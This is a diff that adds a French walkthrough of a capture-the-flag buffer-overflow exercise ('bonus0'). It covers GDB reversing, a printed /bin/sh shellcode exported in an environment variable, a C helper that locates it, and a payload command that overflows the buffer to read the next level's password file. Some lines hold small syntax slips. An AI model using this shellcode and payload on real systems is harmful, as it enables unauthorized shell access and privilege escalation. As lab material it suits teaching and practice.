@@ -1,0 +1,26 @@
+Bonus0:
+
+On lance le binaire. On voit qu'il attends une entree. On ecrit une longue suite de a. Il demande une seconde entree. Il demande un a. Cela ne crash pas. On relance, on recommence en inversant les a. Ca segfault. On va sur le site de jason-rush pour generer une chaine de caracteres. On refait crasher sur GDB. On recupere la derniere adresse. On regarde l'offset d'attaque, c'est 6. Cool. 
+
+On lance GDB, on disas le main et on voit qu'il call une fonction pp. On disas pp et on voit une declaration de buffer (sub 0x50 [dec 80], puis decalage de 0x4 [dec 4] puis retour en arriere de 0x30 [dec 48] qui correspond sans doute a deux buffer. Puis deux call a une fonction p. On disas p. On voit un gros bufer de 4096 a <p>+20. La fonction lit sur l'entree standard puis enregistre la chaine. Juste apres le read on voit un strchr qui prend en parametre 0xa = newline character. C'est ce qui permet de differencier les deux lignes. On revient a <pp> qui concatene les deux chaines via un strcat puis les affiche. Il y a un call a strcpy donc on peut tenter de l'overflow. 
+
+En gros on va chercher a ecrire entierement dans le premier buffer pour provoquer un overflow puis ecrire l'adresse de notre shellcode. On recupere le shellcode de notre exercice 2 et on le met dans l'environnement.
+export SHELLCODE =`python -c 'print "\x90" * 500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*47 + "\x20\xce\xff\xffcat /home/user/bonus1/.pass; exit;"'`
+
+On ecrit un programme pour trouver son adresse en memoire.
+vim /tmp/getshellcode.c 
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int		main(int argc, char **argv)
+{
+	printf("SHELLCODE: %p\n, getenv("SHELLCODE"));
+	return (0);
+}
+
+cd /tmp/ && gcc getshellcode.c
+
+On execute le payload avec:
+python -c 'print "A" * 4095 + "\n" + "A" * 9 + "\xb9\xf8\xff\xbf" + "A" * 30' > /tmp/payload && cat /tmp/payload - | /home/user/bonus0/bonus0
+Payload fill le buffer de p puis depasse de 9, charge l'adresse du shellcode dans l'environnement et fill le reste du buffer.
